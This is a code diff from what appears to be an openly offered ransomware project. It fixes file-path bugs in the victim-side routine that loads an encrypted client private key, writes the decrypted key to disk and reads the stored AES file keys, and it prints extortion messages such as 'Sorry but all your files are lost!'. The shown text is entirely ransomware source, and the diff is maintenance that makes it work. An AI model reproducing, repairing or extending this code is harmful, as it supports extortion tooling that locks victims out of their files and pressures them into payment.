@@ -120,7 +120,7 @@ def payment():
 def menu():
     print("{}Importing the encrypted client private key".format(WHITE))
     try:
-        with open(os.path.join(ransomware_path, '/encrypted_client_private_key.key'),
+        with open(os.path.join(ransomware_path, 'encrypted_client_private_key.key'),
                   'rb') as f:
             encrypted_client_private_key = pickle.load(f)
     except IOError:
@@ -145,12 +145,12 @@ def menu():
 
     # saving to disk the private key
     print("{}Client private key decrypted and stored to disk{}".format(GREEN, WHITE))
-    with open(os.path.join(ransomware_path, "/client_private_key.PEM"), 'wb') as f:
+    with open(os.path.join(ransomware_path, "client_private_key.PEM"), 'wb') as f:
         f.write(client_private_key)
 
     # GET THE AES KEYS and path
     try:
-        with open(os.path.join(ransomware_path, "/AES_encrypted_keys.txt")) as f:
+        with open(os.path.join(ransomware_path, "AES_encrypted_keys.txt")) as f:
             content = f.read()
     except IOError:
         print("AES keys not found. Sorry but all your files are lost!")
